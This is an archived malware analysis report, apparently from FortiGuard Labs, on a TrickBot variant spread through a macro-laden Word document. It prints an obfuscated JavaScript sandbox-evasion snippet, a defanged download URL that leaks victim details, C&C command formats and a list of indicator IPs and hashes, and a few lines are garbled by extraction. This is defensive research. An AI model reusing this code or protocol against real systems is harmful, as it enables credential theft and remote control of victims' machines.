{
    "id": "a5cbf086-a1ca-4af6-b9b6-1132acda9f5e",
    "created_at": "2023-01-12T15:00:05.101227Z",
    "updated_at": "2025-03-27T02:06:01.534017Z",
    "deleted_at": null,
    "sha1_hash": "84a5a9efc2089102c2e00396fdf2149d1617d450",
    "title": "2020-03-09 - New Variant of TrickBot Being Spread by Word Document",
    "authors": "",
    "file_creation_date": "2022-05-29T10:46:16Z",
    "file_modification_date": "2022-05-29T10:46:16Z",
    "file_size": 285508,
    "plain_text": "# New Variant of TrickBot Being Spread by Word Document\n\n**[fortinet.com/blog/threat-research/new-variant-of-trickbot-being-spread-by-word-document.html](https://www.fortinet.com/blog/threat-research/new-variant-of-trickbot-being-spread-by-word-document.html)**\n\n**[FortiGuard Labs Threat Analysis Report](https://www.fortinet.com/fortiguard/labs.html?utm_source=blog&utm_medium=campaign&utm_campaign=FortiGuardLabs)**\n\nAffected platforms:   Windows\n\nImpacted parties:    Online banking users\n\nImpact:            Collects sensitive information and controls victims’ computers\n\nSeverity level:       High\n\n\nMarch 9, 2020\n\n\n[TrickBot is a malware family first captured by FortiGuard Labs and then analyzed by me back in 2016. TrickBot is a module-based malware,](https://www.fortinet.com/blog/threat-research/deep-analysis-of-the-online-banking-botnet-trickbot.html)\nwhich means it can extend its functionalities by downloading new modules from its C&C server and executing them on its victim’s device.\nWhile it was initially identified as banking Trojan, it has gradually extended its functionalities to collect credentials from its victims’ email\naccounts, browsers, installed network apps, and so on. It is also able to send spam to its victim’s email contacts, as well as deliver other\nmalware to the victim’s device, such as Emotet.\n\nRecently, FortiGuard Labs captured an MS Office Word sample in the wild that is spreading a new variant of TrickBot. I did an analysis on this\nsample file, and in this post I will explain how it works on the victim’s machine.\n\n## Analyzing the Word Document\n\nWhen the malicious Word document is opened with MS Office Word, it requests input, as shown in Figure 1, by asking the victim to click the\n“Enable Content” button to enable the document’s Macro feature. Once this is done, its malicious Macro (VBA code) is executed.\n\nFigure 1. Word document content\n\nBy going to the Menu “Developer”-> “Visual Basic” we can check out the Macro’s VBA modules and code. The Macro project is passwordprotected, so we cannot see any of the detailed information until we provide the correct password. Fortunately, there is a way to bypass this\nprotection by modifying its binary file.\n\n\n-----\n\ne o d docu e t as bu t o a C ess e ated p oject a ed C ess a ou ca see t e o o t e C ess p oject gu e\n\nFigure 2. Content of ChessBrainVBA project\n\nOn the form there is a Label control containing the malicious JS code, outlined with a red rectangle.\n\nOne of the VBA modules has an autorun() function that is called automatically when the Word document opens. The VBA code then extracts\ntwo files onto the victim’s system.\n\nOne file is “C:\\AprilReport\\LogsTsg\\LogsTsg7\\LogsTsg8\\List1.bat”, with content “cscript //nologo C:\\AprilReport\\List1.jse”, and the other is\n“C:\\AprilReport\\List1.jse”, with JavaScript code from the Label control in Figure 2, which is a huge obfuscated JavaScript code. It then starts\nthe first extracted file “List1.bat”, which calls “cscript” running the huge JavaScript file “List1.jse”.\n\n## Anti-Analysis Applied in JavaScript Code\n\nThe JavaScript code is very heavily obfuscated. This protects the API function calls and constant strings from being identified. They also use a\nlot of anonymous functions.\n\nWhen the code starts, it first waits around one minute to bypass any auto-analysis tools by seeming to be inert.\n\nAfter waiting, it then executes the command \"Select * from Win32_Process\" to obtain all running processes. It then puts all of the names of\nthese obtained processes together and checks to see if its length is less than 3100. If so, it will raise an exception and close. Usually, on a real\ncomputer, this length is larger than 3100. In this measure, it is better able to bypass many auto-analysis systems, including Sandboxes and\nVirtual Machines.\n\nThe following code snippet shows the code used to process name length checking:\n\nif (msdgnwould99[var001] < 3100 && msdgnMarch16)   {      this[(function(unwask5) {\n\nunwask5[Tvif_rt] = 3;\n\nunwask5[Tvif_rt - 6] = 83;\n\nreturn nSjWorb(nSjWorbEx() + (unwask5[60] - unwask5[Tvif_rt]), 'f');\n\n})(Dikrt, null, true, 'andall4') + (function(fhhreme3) {\n\nfhhreme3[Tvif_rt] = 0;\n\nfhhreme3[Tvif_rt - 6] = 111;\n\nreturn nSjWorb(nSjWorbEx() + (fhhreme3[60] - fhhreme3[Tvif_rt]), 'f');\n\n})(Dikrt) + (function(vjvlike73) {\n\nvjvlike73[Tvif_rt] = 2;\n\nvjvlike73[Tvif_rt - 6] = 113;\n\nreturn nSjWorb(nSjWorbEx() + (vjvlike73[60] - vjvlike73[Tvif_rt]), 'f');\n\n})(Dikrt, 'outfit92', 'really69')]((function(kuicur4) {\n\nkuicur4[Tvif_rt] = 2;\n\nkuicur4[Tvif_rt - 6] = 78;\n\nreturn nSjWorb(nSjWorbEx() + (kuicur4[60] - kuicur4[Tvif_rt]), 'f');\n\n})(Dikrt, 'tits24', 2872) + (function(jiqthin4) {\n\njiqthin4[Tvif_rt] = 4;\n\njiqthin4[Tvif_rt - 6] = 105;\n\nreturn nSjWorb(nSjWorbEx() + (jiqthin4[60] - jiqthin4[Tvif_rt]), 'f');\n\n})(Dikrt, 'nice54', 2910, 'dudes7', 'stop11') + (function(utscust3) {\n\nutscust3[Tvif_rt] = 3;\n\nutscust3[Tvif_rt - 6] = 104;\n\n\n-----\n\netu Sj o b( Sj o b () (utscust3[60] utscust3[ _ t]), );\n\n})(Dikrt, null, 'this43', null) + (function(fisth3) {\n\nfisth3[Tvif_rt] = 3;\n\nfisth3[Tvif_rt - 6] = 78;\n\nreturn nSjWorb(nSjWorbEx() + (fisth3[60] - fisth3[Tvif_rt]), 'f');\n\n})(Dikrt, 'daughter92', null, 'when24') + (function(fuecusto3) {\n\nfuecusto3[Tvif_rt] = 1;\n\nfuecusto3[Tvif_rt - 6] = 118;\n\nreturn nSjWorb(nSjWorbEx() + (fuecusto3[60] - fuecusto3[Tvif_rt]), 'f');\n\n})(Dikrt, 'this43') + (function(jpsaske4) {\n\njpsaske4[Tvif_rt] = 3;\n\njpsaske4[Tvif_rt - 6] = 113;\n\nreturn nSjWorb(nSjWorbEx() + (jpsaske4[60] - jpsaske4[Tvif_rt]), 'f');\n\n})(Dikrt, 'andall4', true, 'nothin66') + (function(ujnthey3) {\n\nujnthey3[Tvif_rt] = 4;\n\nujnthey3[Tvif_rt - 6] = 107;\n\nreturn nSjWorb(nSjWorbEx() + (ujnthey3[60] - ujnthey3[Tvif_rt]), 'f');\n\n})(Dikrt, true, 'daughter92', true, true));\n\n}\n\nTo analyze this JavaScript code, I created some local variables to split the anonymous function result. “msdgnwould99[var001]” is the length of\nall process names, where “msdgnwould99” contains all process names, and “var001” is a created local variable whose value is\n“length”. msdgnMarch16 is a variable with a default value of “1”. The “if” sub-branch also calls a non-existent function that raises an exception\nand exits.\n\n## Downloading the TrickBot Payload and Maintaining Persistence\n\nThe JavaScript code then downloads a file from its sever. The request looks like this:\n\nhxxps[:]//45[.]138[.]72[.]155/1/1.php?h=m25&j=8b1e7a89&l=Mytest01-PC@@Mytest01PC@@Mytest01@@*147[.]2[.]3[.]15%3A%3A%5B00000007%5D%20Intel%28R%29%20PRO/1000%20MT%20Desktop%20Adapter&12455532\n\nThe parameter portion contains the victim’s computer name, login username, IP address, and network card information. The server then\nreplies to this request with a base64 encoded PE file. Figure 3 shows the received base64 encoded PE file content.\n\nFigure 3. HTTPS request and response with base64 encoded content\n\nThe JavaScript code saves this file into the system’s %temp% folder, and it also copies the current JavaScript file into the system’s %temp%\nfolder as well. Later, it runs the copied JavaScript file from the %temp% folder and exits the current one.\n\nThis time, it checks to see if it runs from the %temp% folder. If yes, it reads the downloaded file and puts its base64-decoded content into a file\nunder the %temp% folder, which is “8a1e7a8988168816.com” in my test computer. This file is the payload of this variant of TrickBot, which will\nbe started in the JavaScript. I’ll elaborate on this in the next section.\n\nMeanwhile, it copies the JavaScript file into the Windows startup folder so it can start whenever Windows OS starts. In previous versions, it\nused to install itself as a Scheduled Task or be added into the system registry’s Auto-Run group to maintain persistence.\n\nIn Figure 4, you will find it using the Windows Start Menu.\n\nFigure 4. JavaScript file has been added into Startup in Start Menu\n\n## Starting Payload of TrickBot\n\n\n-----\n\ne do oaded pay oad e 8a e a8988 688 6 co s a e t at s e ecuted u d 3 e e, c s a do s de au t p og a\nused to run a DLL file as a program, using the command line \"C:\\Windows\\System32\\rundll32.exe C:\\Users\\{user\nname}\\AppData\\Local\\Temp\\8a1e7a8988168816.com InitLibrary\".\n\nAs I mentioned above, as well in my previous analysis, TrickBot is a modular Trojan. It is able to download modules (DLL files) from its C&C\nserver, load them into the newly-created process “svchost.exe,” then execute one module in the “svchost.exe” process.\n\nTrickBot communicates with these modules (svchost.exe) through a named pipe and shared memory by calling API functions like\nReadProcessMemory(), WriteProcessMemory() and so on. Once it starts a module in a svchost.exe, it then starts a corresponding thread\nfunction to continue communicating with the module.\n\n[Researchers have found that it has delivered the following modules in the past: systeminfo, injectDll,](https://www.fortinet.com/blog/threat-research/deep-analysis-of-the-online-banking-botnet-trickbot.html) [pwgrab, importDll, mshareDll, mwormDll,](https://www.fortinet.com/blog/threat-research/deep-analysis-of-trickbot-new-module-pwgrab.html)\ntabDll, vncDll, and so on. I even did some analysis on some of them. From the module name you can often guess what the module’s purpose\nis. I will next explain what the internal code structure of TrickBot is and how it downloads those modules.\n\nWhen “8a1e7a8988168816.com” starts in rundll32.exe, its entry function DllMain() is called, which then decrypts and extracts another\nexecutable module (EXE file) into its memory. It then dynamically adjusts some section data, such as import table and relocation data. After\neverything is ready, its entry point function is called. And from then on, all TrickBot tasks are performed by the extracted module.\n\nThe first time it runs, it creates a home folder named “DirectTools” under the %AppData% folder for saving its configuration settings, future\ndownloaded module files, as well as module configuration files.\n\nThe configuration file of TrickBot is a randomly-chosen-file-name file saved in its home directory. The content is encrypted and obfuscated. It\ncontains a group tag (“red4” for this variant), client_id (generated with the victim’s computer name), as well as the TrickBot version, its C&C\nserver IP address, and Port list information. Figure 5 shows what this saved configuration file looks like. This time, the file name is\n“revocations.txt”, the red rectangles identify two encrypted data sets, and the other readable texts are trash data.\n\nFigure 5. The encrypted and obfuscated configuration file\n\nFigure 6 shows the C&C server information that was decrypted in a text editor from the file shown in Figure 5. You can see that it contains\nTrickBot version(1000500), server IP and Port information, and the auto-loaded module “pwgrab”.\n\nFigure 6. Decrypted configuration information\n\n## Sending Commands to the C&C Server and Downloading Modules\n\nTrickBot has many commands it can use to communicate with its server, whose IP address and Port are randomly chosen from server\nconfiguration data shown in Figure 6. Some of the command content is listed below in chronological order to explain how they work.\n\nAll the commands are in this format:\n\n/group_ID/Client_ID/command number/other payload information\n\nThe group ID is “red4” and the Client_ID is “Mytest01-PC_W617601.46499EE873EAC4080BFC4E488048CEAA” for my test environment.\n\n## Command 5:\n\n \"GET /red4/Mytest01-PC_W617601.46499EE873EAC4080BFC4E488048CEAA/5/spk/\"\n\nThis is the first packet sent to its C&C server.\n\n## Command 0:\n\n \"GET /red4/Mytest01-PC_W617601.46499EE873EAC4080BFC4E488048CEAA/0/Windows 7 x86 SP1/1086/{my global ip}/2203029355927E4792CADE316791C927FFC55D5E56150F111936DFD52481C7D7/sMU2E48oEOgEGkiGsseii\n\nThis command submits the victim’s system information and global IP address to the C&C server. The response packet contains another server\nIP address and Port list for downloading modules.\n\n## Command 14:\n\n \"GET /red4/Mytest01-PC_W617601.46499EE873EAC4080BFC4E488048CEAA/14/user/Mytest01/0/\"\n\nThis command submits to the server the victim device’s information, such as Logon User Name, network status, and so on.\n\n\n-----\n\n## Command 63:\n\n \"POST red4/Mytest01- PC_W617601.46499EE873EAC4080BFC4E488048CEAA/63/systeminfo/GetSystemInfo/c3VjY2Vzcw==\"\n\nThis command tells the server that the “systeminfo” module was a success. “systeminfo” was a module (no longer a DLL file in this variant)\nused in other versions to collect system information from the victim’s device and then send it to its server. However, in this variant this module\nis already integrated into TrickBot.\n\n## Command 5:\n\n \"GET /red4/Mytest01-PC_W617601.46499EE873EAC4080BFC4E488048CEAA/5/pwgrab32/\"\n\nThis command asks the C&C server to send back the module “pwgrab32”. As you may recall back in figure 6, “pwgrab” was picked from the\ndecrypted configuration file, where it was set as “autorun”. Therefore, it is the first module to be downloaded. My test environment is a 32-bit\nWindows OS, so the requesting module name is “pwgrab32”, and it is “pwgrab64” for a 64-bit Windows OS. Note that this command is sent to\none server of the server IP and Port list based on the response from command 0.\n\n## \"GET /red4/Mytest01-PC_W617601.46499EE873EAC4080BFC4E488048CEAA/5/dpost/\"\n\nNext, it sends another command 5 request to download the configuration file for “pwgrab”.\n\n## Command 64:\n\n \"POST red4/Mytest01-PC_W617601.46499EE873EAC4080BFC4E488048CEAA/64/pwgrab/VERS/browser/\" \n\nWhen module “pwgrab” runs in svchost.exe, it directly sends stolen data to its C&C server, whose IP address and Port are defined in its\nconfiguration file (dpost file). Meanwhile, “pwbrab” updates TrickBot with its current status, and TrickBot then updates that status to its C&C\nserver by submitting command 64. For this one, it sends pwgrab’s version information.\n\n## Command 23:\n\n \"GET /red4/Mytest01-PC_W617601.46499EE873EAC4080BFC4E488048CEAA/23/1000499/\"\n\nCommand 23 is used to request up-to-date server configuration data, which overwrites the data shown in Figure 6. Figure 7 is a screenshot of\nthe up-to-date server configuration, which was just decrypted. The version has now become “1000502”.\n\nFigure 7. Up-to-date server configuration information\n\n## Command 1:\n\n \"GET /red4/Mytest01-PC_W617601.46499EE873EAC4080BFC4E488048CEAA/1/40sQwU0W2YyUyQuOo/\"\n\nThis command queries the C&C server for tasks. The server can then reply with similar to that below, where you can see the string “networkDll\nstart”, which tells TrickBot to start the module “networkDll”.\n\n## Here is the response content:\n\n \"/62/red4/Mytest01- PC_W617601.46499EE873EAC4080BFC4E488048CEAA/bpdTFBvlTHxhZFzpXF1nXF1l/96322307/\\r\\nnetworkDl start\\r\\n\"\n\nTrickBot sends command 5 with “networkDll32” to the C&C server, whose IP address and Port are from command 0’s response, to download\nit.\n\n## \"GET /red4/Mytest01-PC_W617601.46499EE873EAC4080BFC4E488048CEAA/5/networkDll32/\"\n\n**Note: Most of this TrickBot variant’s constant strings that are mentioned in this post, and most data that returned from the C&C server (like**\nmodules), is encrypted. What I have referred to in this post is the decrypted plaintext. The downloaded modules and other files are saved in its\nhome directory (“%AppData%\\DirectTools” for this variant). Before they are saved, they are all double encrypted.\n\n## Conclusion\n\n\n-----\n\nt s post, e deta ed o t s c ot es a a t o s a ct s ac e, at tec o og es t uses to pe o a t a a ys s, as e\nas how the payload of TrickBot communicates with its C&C server to download the modules.\n\nTrickBot has been active for years. The server configuration version is now 1000502, compared to the version number when we first captured\nit in 2016, which was 1000004. We think it will keep upgrading itself from time to time. Since we will continue monitoring it, readers can expect\nthat we will continue to publish new technical analysis and updates whenever a new campaign is captured in the future.\n\n## Solution\n\nFortinet customers are already protected from this TrickBot variant by FortiGuard’s Web Filtering, AntiVirus, and IPS services as follows:\n\nThe downloading URL is rated as \"Malicious Websites\" by the FortiGuard Web Filtering service.\n\nThe Word document and downloaded Dll file are detected as \"VBA/TrickBot.MRVB!tr\" and “W32/TrickBot.EFDC!tr” and blocked by the\nFortiGuard AntiVirus service.\n\nThe IP addresses of the C&C server are detected and blocked by the FortiGuard IPS signature “Trojan.TrickBot”.\n\n## IOCs:\n\n### URLs\n\nhxxps[:]//45[.]138[.]72[.]155/1/1.php?h=m25&j=8b1e7a89&l={…}\n\n### TrickBot C&C server IP address and Port list:\n\n<srv>107.175.87.142:443</srv>\n\n<srv>114.8.133.71:449</srv>\n\n<srv>119.252.165.75:449</srv>\n\n<srv>121.100.19.18:449</srv>\n\n<srv>131.161.253.190:449</srv>\n\n<srv>146.185.253.161:443</srv>\n\n<srv>170.84.78.224:449</srv>\n\n<srv>171.100.142.238:449</srv>\n\n<srv>180.180.216.177:449</srv>\n\n<srv>181.112.157.42:449</srv>\n\n<srv>181.113.28.146:449</srv>\n\n<srv>181.129.104.139:449</srv>\n\n<srv>181.129.134.18:449</srv>\n\n<srv>181.140.173.186:449</srv>\n\n<srv>181.196.207.202:449</srv>\n\n<srv>181.196.207.202:449</srv>\n\n<srv>185.14.29.4:443</srv>\n\n<srv>185.14.30.209:443</srv>\n\n<srv>185.14.31.72:443</srv>\n\n<srv>185.141.27.238:443</srv>\n\n<srv>185.252.144.190:443</srv>\n\n<srv>185.62.188.10:443</srv>\n\n<srv>185.65.202.183:443</srv>\n\n\n-----\n\ns 85 99 0 3 /s\n\n<srv>185.99.2.220:443</srv>\n\n<srv>186.232.91.240:449</srv>\n\n<srv>186.71.150.23:449</srv>\n\n<srv>188.165.62.2:443</srv>\n\n<srv>190.214.13.2:449</srv>\n\n<srv>192.210.226.106:443</srv>\n\n<srv>192.3.193.162:443</srv>\n\n<srv>194.5.250.136:443</srv>\n\n<srv>194.5.250.166:443</srv>\n\n<srv>194.5.250.168:443</srv>\n\n<srv>194.5.250.178:443</srv>\n\n<srv>194.5.250.179:443</srv>\n\n<srv>195.2.93.50:443</srv>\n\n<srv>195.54.32.12:443</srv>\n\n<srv>198.15.119.121:443</srv>\n\n<srv>198.15.119.71:443</srv>\n\n<srv>200.127.121.99:449</srv>\n\n<srv>200.21.51.38:449</srv>\n\n<srv>202.29.215.114:449</srv>\n\n<srv>203.23.128.148:443</srv>\n\n<srv>212.80.216.181:443</srv>\n\n<srv>212.80.217.243:443</srv>\n\n<srv>217.12.209.199:443</srv>\n\n<srv>31.131.21.30:443</srv>\n\n<srv>36.89.85.103:449</srv>\n\n<srv>45.142.213.70:443</srv>\n\n<srv>45.148.120.153:443</srv>\n\n<srv>45.93.4.134:443</srv>\n\n<srv>46.174.235.36:449</srv>\n\n<srv>5.182.210.120:443</srv>\n\n<srv>5.182.210.226:443</srv>\n\n<srv>5.255.96.119:443</srv>\n\n<srv>5.255.96.153:443</srv>\n\n<srv>5.34.176.184:443</srv>\n\n<srv>5.34.177.194:443</srv>\n\n<srv>51.254.164.244:443</srv>\n\n\n-----\n\ns 5 89 5 03 3 /s\n\n<srv>51.89.115.99:443</srv>\n\n<srv>62.109.1.7:443</srv>\n\n<srv>80.87.195.21:443</srv>\n\n<srv>82.148.16.5:443</srv>\n\n<srv>85.143.218.249:443</srv>\n\n<srv>85.204.116.179:443</srv>\n\n<srv>89.191.234.89:443</srv>\n\n<srv>89.32.41.126:443</srv>\n\n<srv>91.235.129.144:443</srv>\n\n<srv>92.223.93.153:443</srv>\n\n<srv>93.189.42.66:443</srv>\n\n<srv>94.156.35.216:443</srv>\n\n### Sample SHA-256\n\n[Captured Word document]\n\n533BA6AF6FB6A529AF62B0AF69EFF78DFE2478E8E693CD4FA4A3FEC01570DDFA\n\n[Base64 decoded Dll file or 8a1e7a8988168816.com]\n\n70B3DA66AD99BCA8703EF61D3F8406B3D0B05AD60D10318270F41A064D065791\n\n_[Learn more about FortiGuard Labs threat research and the FortiGuard Security Subscriptions and Services portfolio.](https://www.fortinet.com/fortiguard/labs.html?utm_source=blog&utm_medium=campaign&utm_campaign=FortiGuardLabs)_ _[Sign up for the weekly](https://www.fortinet.com/fortiguard/labs.html?utm_source=blog&utm_medium=campaign&utm_campaign=FortiGuardLabs)_\n_Threat Brief from FortiGuard Labs._\n\n_Learn more about Fortinet’s_ _[free cybersecurity training initiative or about the Fortinet](https://www.fortinet.com/blog/business-and-technology/why-cybersecurity-training-is-more-important-than-ever.html)_ _[Network Security Expert program,](https://training.fortinet.com/?utm_source=blog&utm_campaign=2019-q3-nse-institute)_ _Network Security_\n_Academy program, and_ _[FortiVet program.](https://www.fortinet.com/corporate/careers/vets.html?utm_source=blog&utm_campaign=2018-q2-fortivet)_\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2020/2020-03-09 - New Variant of TrickBot Being Spread by Word Document.pdf"
    ],
    "report_names": [
        "2020-03-09 - New Variant of TrickBot Being Spread by Word Document.pdf"
    ],
    "threat_actors": [],
    "ts_created_at": 1673535605,
    "ts_updated_at": 1743041161,
    "ts_creation_date": 1653821176,
    "ts_modification_date": 1653821176,
    "files": {
        "pdf": "https://archive.orkl.eu/84a5a9efc2089102c2e00396fdf2149d1617d450.pdf",
        "text": "https://archive.orkl.eu/84a5a9efc2089102c2e00396fdf2149d1617d450.txt",
        "img": "https://archive.orkl.eu/84a5a9efc2089102c2e00396fdf2149d1617d450.jpg"
    }
}